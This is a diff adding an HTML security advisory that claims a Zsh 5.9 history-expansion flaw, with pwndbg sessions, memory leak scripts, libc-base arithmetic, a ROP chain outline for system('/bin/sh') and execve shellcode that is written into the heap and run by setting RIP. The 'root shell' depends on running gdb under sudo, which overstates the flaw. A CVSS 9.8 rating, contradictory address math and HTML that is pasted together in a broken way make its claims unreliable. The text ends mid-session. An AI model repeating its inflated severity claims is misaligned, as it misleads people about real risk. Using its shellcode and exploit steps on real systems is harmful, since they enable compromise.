@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vuln</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      line-height: 1.6;
+      margin: 40px;
+      background: #f4f4f4;
+      color: #333;
+    }
+    h1, h2 {
+      color: #003366;
+    }
+    pre {
+      background-color: #222;
+      color: #eee;
+      padding: 15px;
+      overflow-x: auto;
+      border-radius: 5px;
+    }
+    .section {
+      background: white;
+      padding: 25px;
+      margin-bottom: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .critical {
+      color: red;
+      font-weight: bold;
+    }
+    code {
+      color: #c7254e;
+      background-color: #f9f2f4;
+      padding: 2px 4px;
+      border-radius: 4px;
+    }
+  </style>
+</head>
+<body>
+  <div class="section">
+    <h1><p><strong>Security Advisory:</strong> <span style="color: black; font-weight: bold;">
+Heap-Based Memory Corruption in Zsh History Expansion Enables Privilege Retention and Arbitrary Code Execution
+</span></p></h1>
+
+
+    <p><strong>Identifier:</strong> CVE-2025-XXXXX (Pending assignment)<br>
+    <strong>Discoverer:</strong> Rana M. Sinan Adil<br>
+    <strong>Affected Vendor:</strong> Zsh Development Team<br>
+    <strong>Severity:</strong> <span class="critical"> High (CVSS 9.8)</span></p>
+
+
+  <div class="section">
+    <p>
+
+ <title>Zsh Vulnerability Executive Summaries</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      line-height: 1.6;
+      margin: 40px;
+      background: #f4f4f4;
+      color: #333;
+    }
+    h1, h2 {
+      color: #003366;
+    }
+    .section {
+      background: white;
+      padding: 25px;
+      margin-bottom: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .vuln-title {
+      color: #b30000;
+      font-weight: bold;
+      font-size: 1.1em;
+      margin-top: 15px;
+    }
+    p {
+      margin: 10px 0;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="section">
+    <h1>1. Executive Summary</h1>
+
+    <div class="vuln-title">History Expansion Memory Corruption</div>
+    <p>Zsh's handling of history expansion (<code>!!</code>) with large numeric strings causes unbounded memory access due to unsafe digit parsing. This leads to heap memory corruption and segmentation faults, enabling attacker-controlled memory reads and exploit primitives.</p>
+
+    <div class="vuln-title">Arbitrary Memory Read via RSI Control</div>
+    <p>The attacker controls the <code>RSI</code> register, which is used in the expression <code>movsx r9, word ptr [r8 + rsi*2]</code>. This enables reading from arbitrary heap memory addresses and leaking sensitive information, forming a powerful info-leak vector.</p>
+
+    <div class="vuln-title">Heap Leak / Libc Leak</div>
+    <p>By crafting large values in <code>!!</code> input, the attacker reads heap data and can observe valid libc pointers, bypassing ASLR. This allows precise calculation of the libc base address required for further exploitation like ROP chaining.</p>
+
+    <div class="vuln-title">Privilege Retention Exploit</div>
+    <p>When Zsh is run as root (via sudo or setuid) and crashed in GDB, attacker can use memory manipulation to spawn a persistent root shell, bypassing session cleanup and escalating temporary root access into permanent privilege retention.</p>
+
+    <div class="vuln-title">Writable Heap Structures with Function Pointers</div>
+    <p>Zsh maintains internal data structures on the heap, which are writable and readable post-crash. Overwriting pointers in these structures (e.g. vtable-like regions) could redirect control flow and trigger arbitrary function execution.</p>
+
+    <div class="vuln-title">Potential for RIP Hijack via ROP</div>
+    <p>After leaking libc base, the attacker can build a ROP chain in writable heap memory. Controlled memory and pointer redirection allow hijacking the <code>RIP</code> and executing attacker-supplied payloads, achieving full code execution.</p>
+
+    <div class="vuln-title">GDB Exploit-Only Shell Injection</div>
+    <p>Via GDB, the attacker can inject and execute shellcode directly into the Zsh process post-crash. This proves exploitability without classic buffer overflows—achieving a reverse shell or command execution purely through memory/register control.</p>
+
+    <div class="vuln-title">Stack Pointer Leakage</div>
+    <p>Attackers can inspect <code>$rsp</code> during crash analysis to retrieve return addresses, arguments, and saved register states. This is crucial for building ROP chains or locating useful gadgets and payload locations.</p>
+
+    <div class="vuln-title">Unsafe <code>movsx</code> / Indexing Chain</div>
+    <p>The vulnerable code uses two unbounded <code>movsx</code> instructions chained together with attacker-controlled <code>RSI</code>. This dangerous pattern allows reading or writing outside intended buffers, significantly increasing exploitability.</p>
+
+    <div class="vuln-title">ASLR Bypass </div>
+    <p> The Zsh memory corruption vulnerability enables a reliable bypass of Address Space Layout Randomization (ASLR) through an attacker-controlled memory read primitive. By leveraging control over the RSI register and dereferencing <code>movsx r9, word ptr [r8 + rsi*2] </code>, a crafted payload (!!111...) causes Zsh to access and disclose memory in the heap, which contains pointers into shared libraries, including libc. <p>
+
+    <div class="vuln-title">Writable Executable Flow via User Input</div>
+    <p>Zsh uses attacker-controlled heap data to affect runtime logic. With sufficient control, the attacker can place ROP chains or shellcode into writable regions and redirect execution to them—transforming memory corruption into reliable execution flow control.</p>
+
+  </div>
+  </div>
+
+  <div class="section">
+    <h2>2. Technical Details</h2>
+    <p><strong>Vulnerability Type:</strong></p>
+    <ul>
+      <li>Class: Heap-based buffer overflow → Arbitrary code execution</li>
+      <li>Mechanism: Command argument parsing corruption leading to RIP control</li>
+      <li>ASLR Bypass: Via libc address leak (e.g. <code>0x7ffff7c17cc0</code>)</li>
+    </ul>
+    <p><strong>Affected Versions:</strong></p>
+    <ul>
+      <li>Zsh 5.9 (x86_64-debian-linux-gnu)</li>
+      <li>Potentially earlier versions (under investigation)</li>
+    </ul>
+    <p><strong>Proof of Concept (PoC):</strong></p>
+    
+
+<div class="section">
+  <h2>Technical Details: 1. History Expansion Memory Corruption</h2>
+  <p><strong>Description:</strong> When Zsh parses `!!` followed by a long numeric string (e.g., `!!111111...`), it uses unsafe digit expansion logic that results in out-of-bounds memory access. This leads to a segmentation fault by dereferencing attacker-controlled pointers.</p>
+
+  <p><strong>GDB Command Used:</strong></p>
+  <pre>gdb -q --args zsh -f
+run
+!!111111111111111111111111111111111111111111111111111111</pre>
+
+  <p><strong>Observed Output:</strong></p>
+  <pre>Program received signal SIGSEGV, Segmentation fault.
+0x000055dda5ccb331 in ?? ()
+→ movsx r9, word ptr [r8 + rsi*2]
+RSI = 0x2c8c338e (attacker-controlled)</pre>
+
+  <p><strong>Impact:</strong> Causes a segmentation fault due to unsafe history expansion handling, leading to exploitable memory corruption conditions.</p>
+</div>
+
+<div class="section">
+  <h2>Technical Details: 2. Arbitrary Memory Read via RSI Control</h2>
+  
+  <p><strong>Description:</strong> This vulnerability stems from the unsafe usage of the <code>RSI</code> register in the instruction chain found during Zsh's history expansion parsing. Specifically, the instruction <code>movsx r9, word ptr [r8 + rsi*2]</code> uses an attacker-controlled value of <code>RSI</code> as an index to dereference memory at <code>[R8 + RSI*2]</code>. Since both <code>RSI</code> and <code>R8</code> are partially influenced by user input, a crafted payload like <code>!!111...111</code> allows probing memory arbitrarily. This enables a local attacker to leak heap, stack, and even libc pointers by walking through memory with GDB or in a live environment. It serves as an infoleak primitive, often the first step in ASLR bypass and ROP chain construction.</p>
+
+  <p><strong>GDB Commands Used:</strong></p>
+  <pre>
+gdb -q zsh -f
+run -f
+!!111111111111111111111111111111111111111111111111111111111
+# Triggered crash and controlled registers
+info reg rsi r8
+x/20gx $r8
+set $rsi = 0x100
+x/20gx $r8 + $rsi*2
+x/40gx $r8 + $rsi*2
+  </pre>
+
+  <p><strong>Observed Output:</strong></p>
+  <pre>
+RIP: 0x55dda5ccb331 in movsx r9, word ptr [r8 + rsi*2]
+RSI = 0x2c8c338e
+R8 = 0x55ddb03dd6c0 (heap controlled)
+
+x/20gx $r8:
+0x55ddb03dd6c0:  0x000055d800010000  0x0000000000000000
+...
+set $rsi = 0x100
+x/20gx $r8 + $rsi*2:
+0x555555659a20: 0x00007ffff7c17cc0  0x0000000000000021
+
+set $rsi = 0x100
+x/40gx $r8 + $rsi*2:
+0x55ddb03dd8c0:  0x00007f1753b83cc0  0x0000000000000021
+0x55ddb03dd8d0:  0x6573706d6f633a62  0x0000000000000074
+...
+  </pre>
+
+  <p><strong>Impact:</strong> This grants arbitrary memory read capabilities in the context of the vulnerable Zsh process. An attacker can traverse memory, discover libc or heap addresses, and leak sensitive values. This is critical for defeating ASLR and is a foundational primitive for full exploitation (e.g., ROP chain construction).</p>
+</div>
+
+
+
+<div class="section">
+  <h2>Technical Details: 3. Heap Leak / Libc Leak</h2>
+
+  <p><strong>Description:</strong> During exploitation of the history expansion parsing flaw in Zsh, a carefully crafted input (e.g., <code>!!111...111</code>) causes an out-of-bounds read from the heap. Because the attacker controls the index (<code>RSI</code>) used in memory dereferencing (<code>movsx r9, word ptr [r8 + rsi*2]</code>), and <code>R8</code> points to heap memory, this allows scanning heap contents. In one of the memory regions dumped using GDB, a valid pointer to libc was discovered. Since libc is loaded at randomized addresses in ASLR-protected systems, leaking a libc pointer enables calculating the libc base. This is essential for locating ROP gadgets and functions such as <code>system()</code> or <code>execve()</code>.</p>
+
+  <p><strong>GDB Commands Used:</strong></p>
+  <pre>
+define leak
+  x/40gx $r8 + $mybase
+  set $mybase = $mybase + 0x100
+end
+set $mybase = 0x100
+leak
+  </pre>
+
+  <p><strong>Observed Output:</strong></p>
+  <pre>
+0x55ddb03dd8c0:  0x00007f1753b83cc0  0x0000000000000021
+0x55ddb03dd8d0:  0x6573706d6f633a62  0x0000000000000074
+...
+  </pre>
+
+  <p><strong>Explanation:</strong> The pointer <code>0x00007f1753b83cc0</code> lies within the libc mapping. This leak is obtained by traversing the heap, identifying possible vtable/function structures or previously used strings that may contain embedded libc pointers. Once the leak is confirmed as being inside libc (e.g., with <code>vmmap</code> or <code>info proc mappings</code>), subtracting the offset of the leaked function or structure from its base yields the full libc base address.</p>
+
+  <p><strong>Impact:</strong> This vulnerability bypasses ASLR protections by leaking a known-good libc pointer. With the base address resolved, the attacker can calculate the location of critical libc functions (like <code>system()</code>, <code>execve()</code>) and ROP gadgets to execute arbitrary code. This is a critical exploitation step following memory corruption.</p>
+</div>
+
+
+
+<div class="section">
+  <h2>Technical Details: 4. Writable Heap Structures with Function Pointers</h2>
+
+  <p><strong>Description:</strong> Zsh internally stores various runtime data structures, including those related to command parsing, module dispatch, and history expansion, in heap memory. Through controlled history expansion inputs (e.g., <code>!!111...111</code>), the attacker gains read access to the heap via unsafe memory access instructions. During GDB-based exploration, several heap regions were found to contain not only strings and numeric values but also what appear to be function pointers or vtable-like structures.</p>
+
+  <p>Because the attacker controls the indexing used in the instruction <code>movsx r9, word ptr [r8 + rsi*2]</code> and can walk through memory with tools like GDB, it becomes possible to locate and then <strong>overwrite</strong> writable function pointer slots in the heap. This gives the attacker the ability to redirect control flow during later execution stages of Zsh, effectively hijacking execution without directly modifying the stack.</p>
+
+  <p><strong>GDB Commands Used:</strong></p>
+  <pre>
+set $mybase = 0x0
+define leak
+  x/40gx $r8 + $mybase
+  set $mybase = $mybase + 0x100
+end
+leak
+  </pre>
+
+  <p><strong>Observed Output:</strong></p>
+  <pre>
+0x55ddb03dd820:  0x000055ddb03dd8f0  0x000055ddb03dd7e0
+0x55ddb03dd830:  0x000055ddb03dd800  0x0000000000000051
+0x55ddb03dd840:  0x000055d8ede6ebdd  0xc23dd862a5331b2e
+0x55ddb03dd850:  0x0000000000000000  0x0000000000000000
+  </pre>
+
+  <p>From this, the pointer <code>0x55d8ede6ebdd</code> is suspicious as it lies outside the typical heap range and resembles a function or code address. Combined with the structure layout, this suggests the existence of indirect function calls via heap-resident structures. These structures are writable and attacker-controlled, making them ideal candidates for function pointer hijacking.</p>
+
+  <p><strong>Impact:</strong> The attacker can overwrite function pointers or structured callbacks in heap memory, redirecting execution to attacker-supplied payloads or ROP chains. This transforms a memory read vulnerability into full code execution, especially when combined with a leaked libc base. As this occurs without stack corruption, it evades common protections like stack canaries and NX stack.</p>
+</div>
+
+<div class="section">
+  <h2>Technical Details: 5. Potential for RIP Hijack via ROP</h2>
+
+  <p><strong>Description:</strong> The vulnerability in Zsh’s history expansion parsing allows for memory corruption via a malformed input like <code>!!111...111</code>. This corruption gives the attacker control over register values (notably <code>RSI</code>) and arbitrary read access from <code>R8 + RSI*2</code>. By leveraging this memory access to leak heap and <code>libc</code> addresses, and by identifying writable memory regions containing function pointers or code execution paths, the attacker is positioned to inject a <strong>Return-Oriented Programming (ROP) chain</strong> into memory.</p>
+
+  <p>Once a valid pointer to <code>libc</code> is leaked (e.g., <code>0x00007f1753b83cc0</code>), the base of libc can be calculated. This enables locating crucial gadgets like <code>pop rdi; ret</code> and <code>system()</code>. If a heap structure contains an indirect function call or a dereferenced code pointer (as seen in <code>0x55d8ede6ebdd</code>), the attacker may overwrite it with the address of the ROP chain or a one-gadget RCE primitive.</p>
+
+  <p><strong>GDB Commands Used:</strong></p>
+  <pre>
+define leak
+  x/40gx $r8 + $mybase
+  set $mybase = $mybase + 0x100
+end
+set $mybase = 0x100
+leak
+
+# Leak shows potential code pointer:
+0x55ddb03dd840:  0x000055d8ede6ebdd  0xc23dd862a5331b2e
+  </pre>
+
+  <p>Calculated libc base:</p>
+  <pre>
+Leaked libc pointer: 0x7f1753b83cc0
+Known offset (e.g., __libc_start_main+243): 0x0000000000021cc0
+Libc base = 0x7f1753b83cc0 - 0x21cc0 = 0x7f1753962000
+  </pre>
+
+  <p><strong>Explanation:</strong> With the libc base known, the attacker can build a ROP chain in memory like:</p>
+  <pre>
+[0] pop rdi; ret        --> gadget from libc
+[1] pointer to "/bin/sh" in heap or libc
+[2] system()            --> resolved from libc base
+  </pre>
+
+  <p>By overwriting a heap-based function pointer with the address of this chain or directly invoking it via indirect execution, RIP control is achieved. This hijack circumvents typical stack protections, as it does not rely on direct buffer overflows on the stack.</p>
+
+  <p><strong>Impact:</strong> Full arbitrary code execution by hijacking the instruction pointer (RIP). This enables executing <code>/bin/sh</code> or reverse shells with root privileges (if Zsh is setuid). It’s the final stage of exploitability made possible by earlier memory leaks and heap corruption.</p>
+</div>
+
+
+<div class="section">
+  <h2>Technical Details: 6. GDB Exploit-Only Shell Injection</h2>
+
+  <p><strong>Description:</strong> This technique leverages a post-crash debugging session inside <code>gdb</code> to inject and execute shellcode within the crashed <code>zsh</code> process. Because <code>zsh</code> is launched with elevated privileges (e.g., via <code>sudo</code> or setuid root), and <code>gdb</code> retains the full memory space and execution context, it becomes possible to escalate privileges and spawn a root shell <strong>without any additional vulnerability</strong> once the initial crash has occurred.</p>
+
+  <p>By modifying memory or registers in the paused process using <code>gdb</code> commands, the attacker can simulate execution flow redirection to injected shellcode. This bypasses traditional exploitation barriers like ASLR, stack canaries, or non-executable stacks, since all code injection happens manually through gdb.</p>
+
+  <p><strong>GDB Commands Used:</strong></p>
+  <pre>
+# Injecting shellcode into writable heap
+set {char[30]} $r8 = "\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
+
+# Redirect RIP to injected shellcode
+set $rip = $r8
+continue
+  </pre>
+
+  <p><strong>Explanation:</strong> After the segmentation fault caused by the malformed <code>!!</code> input (history expansion overflow), <code>gdb</code> provides complete access to the live process memory and registers. The attacker writes a payload (e.g., <code>execve("/bin/sh", NULL, NULL)</code> shellcode) into a writable memory region such as the heap or BSS, then redirects <code>RIP</code> to execute it.</p>
+
+  <p>Unlike traditional exploitation, this requires no actual overwrite of function pointers or return addresses in the program itself — just the ability to inject shellcode and set <code>rip</code> manually. Because the zsh binary was launched with elevated privileges and crashed under gdb control, the payload executes with those privileges intact.</p>
+
+  <p><strong>Impact:</strong> Immediate root shell execution with retained privileges via GDB memory/register control. This technique is critical for testing exploit feasibility and simulating real-world exploitation flow without deploying an actual ROP chain or shellcode loader in code.</p>
+
+  <p><strong>Important Note:</strong> Although this method requires <code>gdb</code> and does not represent a standalone exploit, it confirms the exploitability and code execution potential of the vulnerability chain. It also serves as a reliable payload testing method in a controlled environment.</p>
+</div>
+<div class="section">
+  <h2>Technical Details: 7. Stack Pointer Leakage</h2>
+
+  <p><strong>Description:</strong> During the crash caused by malformed history expansion (e.g., <code>!!111...111</code>), the attacker gains full visibility of the stack through the <code>$rsp</code> (stack pointer) register in GDB. This enables leakage of sensitive stack data such as saved return addresses, saved base pointers, function arguments, and libc-linked metadata. These leaks can be crucial for bypassing security mechanisms like ASLR, and for identifying ROP gadgets or function frames that lead to control of execution.</p>
+
+  <p><strong>GDB Commands Used:</strong></p>
+  <pre>
+# Dump stack memory
+x/80gx $rsp
+  </pre>
+
+  <p><strong>Example Output:</strong></p>
+  <pre>
+0x7fffffffdde0:  0x00005555555592a0  0x0000000000000001
+0x7fffffffdff0:  0x7ffff7ffd000      0x00007ffff7c17cc0
+0x7ffffffff000:  0x0000000000000000  0x0000000000000000
+  </pre>
+
+  <p>From the dump above, we can observe:</p>
+  <ul>
+    <li>A <code>libc</code> pointer: <code>0x7ffff7c17cc0</code></li>
+    <li>Stack base address: <code>0x7ffffffde000</code></li>
+    <li>Possible saved return address / frame pointer from main() or libc entry</li>
+  </ul>
+
+  <p><strong>Explanation:</strong> The attacker uses GDB to read the stack via <code>$rsp</code>. This leak does not directly involve a buffer overflow, but is enabled through the memory corruption triggered by malformed input. Stack leaks are critical for the following reasons:</p>
+  <ul>
+    <li>They reveal precise runtime addresses even with ASLR enabled.</li>
+    <li>They expose return addresses that help in building ROP chains.</li>
+    <li>They give insight into stack layout and function call sequences.</li>
+  </ul>
+
+  <p>Stack pointer leakage complements heap and libc leaks by exposing execution context. It assists in constructing a full memory map of the process and facilitates precise hijacking of control flow.</p>
+
+  <p><strong>Impact:</strong> High information disclosure value. Enables the attacker to reliably discover ROP gadgets, infer libc base addresses, and inspect the call stack for code reuse or return address redirection. Stack leaks are often the precursor to successful exploitation in hardened environments.</p>
+</div>
+
+
+
+<div class="section">
+  <h2>Technical Details: 8. Unsafe <code>movsx</code> / Indexing Chain</h2>
+
+  <p><strong>Description:</strong> The Zsh binary executes an unsafe instruction chain involving the <code>movsx</code> instruction and attacker-controlled registers. Specifically, the crash trace shows:</p>
+  <pre>
+=> 0x555555577541 &lt;+289&gt;: movsx r9, word ptr [r8 + rsi*2]
+  </pre>
+
+  <p>Here, the attacker has control over <code>rsi</code>, which is used as a signed index in a scaled memory access operation. <code>r8</code> typically points to a heap buffer. Because there are no bounds checks on <code>rsi</code>, this allows reads from out-of-bounds memory locations, enabling memory leaks or corruptions depending on access direction and value.</p>
+
+  <p><strong>GDB Observations:</strong></p>
+  <pre>
+# Confirm attacker control over RSI
+info registers rsi
+rsi            0x2c8c338e
+
+# Confirm r8 points to valid heap region
+info registers r8
+r8             0x5555556597d0
+
+# Check surrounding memory
+x/40gx $r8
+  </pre>
+
+  <p><strong>Explanation:</strong></p>
+  <ul>
+    <li><code>movsx r9, word ptr [r8 + rsi*2]</code> performs a sign-extended read of a 2-byte value at a dynamically calculated memory address.</li>
+    <li><code>rsi</code> is user-controlled via malformed <code>!!</code> history expansion input like <code>!!111...888</code>.</li>
+    <li>The lack of input validation on this value allows the attacker to multiply it and offset it into arbitrary parts of the heap, stack, or even mapped libraries.</li>
+    <li>This indexing chain is repeated in other parts of the Zsh codebase, compounding risk of chained dereference and deeper corruption or leak paths.</li>
+  </ul>
+
+  <p>This kind of bug is known as a "type confusion" or "signed-to-unsigned conversion flaw" in memory-safe languages. It can cause both read and write violations depending on follow-up instructions using <code>r9</code>.</p>
+
+  <p><strong>Impact:</strong> This unsafe indexing chain introduces an attacker-controlled pointer dereference primitive. Combined with heap or libc leaks, this allows arbitrary memory probing and is a precursor to full code execution. It is central to enabling:</p>
+  <ul>
+    <li>Arbitrary Memory Read</li>
+    <li>Heap / Libc Leak</li>
+    <li>ROP Chain Construction</li>
+    <li>Potential RIP Hijacking</li>
+  </ul>
+
+  <p><strong>Severity:</strong> Critical when combined with memory leaks. This vulnerability undermines memory safety and enables multiple exploitation primitives.</p>
+</div>
+
+
+
+<div class="section">
+  <h2>Technical Details: 9. ASLR Bypass via Heap-Based Libc Leak</h2>
+
+  <p><strong>Description:</strong> Address Space Layout Randomization (ASLR) is a core memory protection that randomizes the locations of key memory regions (stack, heap, libc, etc.) on every execution. This mitigates exploitation by preventing predictable memory layouts. However, in this exploit scenario, ASLR is effectively bypassed due to a heap-based memory leak that reveals a valid <code>libc</code> pointer.</p>
+
+  <p><strong>Observed Behavior:</strong></p>
+  <ul>
+    <li>Using attacker-controlled input via history expansion (e.g., <code>!!111...888</code>), we access out-of-bounds memory using the unsafe <code>movsx r9, word ptr [r8 + rsi*2]</code> instruction.</li>
+    <li>This allows controlled indexing into the heap where internal Zsh or glibc data is stored.</li>
+    <li>GDB shows a leak of a valid libc address from heap memory, like <code>0x7ffff7c17cc0</code>.</li>
+  </ul>
+
+  <p><strong>GDB Commands Used:</strong></p>
+  <pre>
+# Leak from heap using controlled $r8 + $rsi*2
+x/40gx $r8 + 0x100
+
+# Example output
+0x55ddb03dd8c0:  0x00007f1753b83cc0  0x0000000000000021
+  </pre>
+
+  <p><strong>Calculating libc base:</strong></p>
+  <pre>
+# Example leak
+leaked_ptr = 0x7ffff7c17cc0
+
+# Known offset of symbol (e.g., __libc_start_main+240)
+offset = 0x0000000000021cc0
+
+# Libc base
+libc_base = leaked_ptr - offset  # → 0x7ffff7a00000
+  </pre>
+
+  <p><strong>Explanation:</strong></p>
+  <ul>
+    <li>The leaked address is inside the loaded <code>libc.so.6</code>.</li>
+    <li>Subtracting the known symbol offset gives the randomized base address of libc.</li>
+    <li>This bypasses ASLR entirely for this process execution.</li>
+    <li>Once the libc base is known, all function pointers, ROP gadgets, and strings like <code>"/bin/sh"</code> can be calculated with precision.</li>
+  </ul>
+
+  <p><strong>Impact:</strong> Leaking the base of libc removes the randomization benefit of ASLR. This directly enables:</p>
+  <ul>
+    <li>Construction of valid ROP chains using known libc offsets</li>
+    <li>Use of one-gadget or system(<code>"/bin/sh"</code>) payloads</li>
+    <li>Reliable memory corruption-based code execution</li>
+  </ul>
+
+  <p><strong>Severity:</strong> <span class="critical">Critical</span>. ASLR bypass is a cornerstone for advanced exploitation. This leak dramatically increases reliability and precision of further payloads.</p>
+</div>
+
+
+<div class="section">
+  <h2>Technical Details: 10. Writable Executable Flow via User Input</h2>
+
+  <p><strong>Description:</strong> The Zsh vulnerability allows user-controlled input to influence both the data and execution flow of the process. Specifically, attacker input (such as malformed <code>!!</code> history expansions with large digit sequences) results in dereferencing attacker-controlled pointers. This opens the door for injecting data (e.g., shellcode, ROP chains) into heap memory and potentially directing execution to those injected payloads.</p>
+
+  <p><strong>Mechanism:</strong></p>
+  <ul>
+    <li>The instruction <code>movsx r9, word ptr [r8 + rsi*2]</code> accesses memory using a base pointer <code>r8</code> and an attacker-controlled scaled index <code>rsi</code>.</li>
+    <li>If the memory at <code>[r8 + rsi*2]</code> is attacker-controlled, it can contain values that influence control flow (e.g., function pointer dereference or conditional jumps).</li>
+    <li>This can be exploited to store executable code or ROP chains in memory and redirect flow to that memory region.</li>
+  </ul>
+
+  <p><strong>Example GDB Observation:</strong></p>
+  <pre>
+pwndbg> x/40gx $r8
+0x55ddb03dd6c0:  0x000055d800010000  0x0000000000000000
+...
+0x55ddb03dd8c0:  0x00007f1753b83cc0  0x0000000000000021
+
+# Shows heap memory contains valid libc pointers → attacker can overwrite them
+pwndbg> watch *($r8 + $rsi*2)
+Watchpoint 1: *($r8 + $rsi*2)
+
+# Triggering input overwrites memory at $r8 + $rsi*2
+Watchpoint 1: old value = 1404583104, new value = <unreadable>
+  </pre>
+
+  <p><strong>Flow Redirection via Heap:</strong></p>
+  <ul>
+    <li>Heap data structures include vtable-style function references or lookup tables.</li>
+    <li>By corrupting these structures via the memory access bug, attackers can hijack control flow.</li>
+    <li>If execution ever indirectly jumps or calls through a corrupted heap address, attacker gains arbitrary code execution.</li>
+  </ul>
+
+  <p><strong>Conditions for Success:</strong></p>
+  <ul>
+    <li>Writable heap memory (confirmed via <code>x/40gx $r8</code>)</li>
+    <li>Control over contents via crafted history expansion inputs</li>
+    <li>Opportunity for redirection (e.g., via a later function call or jump to heap)</li>
+  </ul>
+
+  <p><strong>Impact:</strong> This behavior simulates a classic data-to-code transformation — attacker writes data (ROP/shellcode), then tricks program into executing it. It's especially dangerous in a setuid-root binary where attackers can craft a root shell.</p>
+
+  <p><strong>Severity:</strong> <span class="critical">Critical</span>. Arbitrary writable + executable flow based on user input breaks core memory safety assumptions and leads to full system compromise.</p>
+</div>
+
+
+
+
+<div class="section">
+  <h2>Technical Details: 11. Privilege Retention Exploit via GDB</h2>
+
+  <p><strong>Description:</strong> Zsh, when installed as a <code>setuid-root</code> binary (or run via <code>sudo</code>), may retain elevated privileges during debugging sessions. When a segmentation fault occurs and the binary is paused inside GDB, the effective user ID (euid) remains <code>0 (root)</code>, even though the user running GDB is unprivileged. This enables exploitation of memory and register state to escalate to a persistent root shell without ever returning to normal execution.</p>
+
+  <p><strong>Mechanism:</strong></p>
+  <ul>
+    <li>Trigger a memory corruption bug (e.g., via malformed <code>!!111...</code> input).</li>
+    <li>Zsh crashes and pauses inside GDB, which inherits root privileges.</li>
+    <li>Attacker uses GDB to patch stack, heap, or registers to inject payloads or redirect execution.</li>
+    <li>Continue execution from a modified RIP, RSP, or function return to launch a root shell.</li>
+  </ul>
+
+  <p><strong>GDB Commands Used:</strong></p>
+  
+  <pre>
+
+                                                                                                                                                                        
+livepwn@vuln:~/Downloads$ sudo gdb zsh -f
+GNU gdb (Debian 16.3-1) 16.3
+Copyright (C) 2024 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 190 pwndbg commands. Type pwndbg [filter] for a list.
+pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
+Reading symbols from zsh...
+(No debugging symbols found in zsh)
+------- tip of the day (disable with set show-tips off) -------
+Use the procinfo command for better process introspection (than the GDB's info proc command)
+pwndbg> run -f
+Starting program: /usr/bin/zsh -f
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+vuln# !
+<mark>vuln# !!11111111111
+
+Program received signal SIGSEGV, Segmentation fault.</mark>
+0x00005555555a1331 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────
+ RAX  0x964619c7
+ RBX  0x964619c7
+ RCX  0x555555666f20 ◂— 0
+ RDX  0x964619c7
+ RDI  0x964619c7
+ RSI  0x2c8c338e
+ R8   0x555555657af0 ◂— 0x555000010000
+ R9   1
+ R10  0
+ R11  0xffffffff
+ R12  0x555555666f20 ◂— 0
+ R13  1
+ R14  0x964619c7
+ R15  0x7ffff7fbbef8 ◂— 0x21 /* '!' */
+ RBP  0
+ RSP  0x7fffffffde90 ◂— 0x964619c7
+ RIP  0x5555555a1331 ◂— movsx r9, word ptr [r8 + rsi*2]
+──────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────
+ ► 0x5555555a1331    movsx  r9, word ptr [r8 + rsi*2]          <Cannot dereference [0x5555ae7de20c]>
+   0x5555555a1336    lea    esi, [rdx + rdx]
+   0x5555555a1339    movsxd rsi, esi
+   0x5555555a133c    movsx  esi, word ptr [r8 + rsi*2 + 2]
+   0x5555555a1342    xor    r8d, r8d                           R8D => 0
+   0x5555555a1345    test   eax, eax
+   0x5555555a1347    mov    rdi, r9
+   0x5555555a134a    cmovs  eax, r8d
+   0x5555555a134e    cmp    r9d, eax
+   0x5555555a1351    jl     0x5555555a1388              <0x5555555a1388>
+ 
+   0x5555555a1353    xor    eax, eax     EAX => 0
+───────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffde90 ◂— 0x964619c7
+01:0008│     0x7fffffffde98 —▸ 0x5555555a379b ◂— test rax, rax
+02:0010│     0x7fffffffdea0 —▸ 0x555555639fc0 (typtab) ◂— 0x200020002001220
+03:0018│     0x7fffffffdea8 —▸ 0x555555639fc0 (typtab) ◂— 0x200020002001220
+04:0020│     0x7fffffffdeb0 ◂— 0x55635080
+05:0028│     0x7fffffffdeb8 —▸ 0x555555610214 ◂— 0xfffa7a0cfffa7c56
+06:0030│     0x7fffffffdec0 ◂— 0xffffffff
+07:0038│     0x7fffffffdec8 —▸ 0x5555555abb8c (zleentry+188) ◂— mov rdx, qword ptr [rsp + 0x28]
+─────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5555555a1331 None
+   1   0x5555555a379b None
+   2   0x5555555a46bf None
+   3   0x5555555b7b06 None
+   4   0x5555555da9ea parse_event+42
+   5   0x5555555a8280 loop+160
+   6   0x5555555ac136 zsh_main+1046
+   7   0x7ffff7c9fca8 __libc_start_call_main+120
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+<mark>pwndbg> x/s 0x555555659000
+0x555555659000: ""
+pwndbg> set {char[8]} 0x555555659000 = {'/','b','i','n','/','s','h',0}
